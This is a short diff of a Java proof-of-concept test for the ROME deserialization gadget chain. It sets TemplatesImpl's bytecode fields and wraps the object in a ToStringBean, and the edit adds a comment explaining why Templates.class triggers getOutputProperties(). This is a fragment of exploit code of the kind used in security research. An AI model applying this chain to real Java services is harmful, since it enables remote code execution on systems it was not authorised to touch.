@@ -70,7 +70,7 @@ public class ROME_PocTest {
         setFieldValue(templatesimpl, "_bytecodes", new byte[][] {bytecodes});
         setFieldValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());
 
-        // 利用
+        // 利用 Templates.class 接口的原因，是因为其只有一个方法，保证能够触发 getOutputProperties() 方法；
 //        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesimpl);
 //        new ToStringBean(Templates.class, templatesimpl).toString();
         ToStringBean toStringBean = new ToStringBean(Templates.class, templatesimpl);
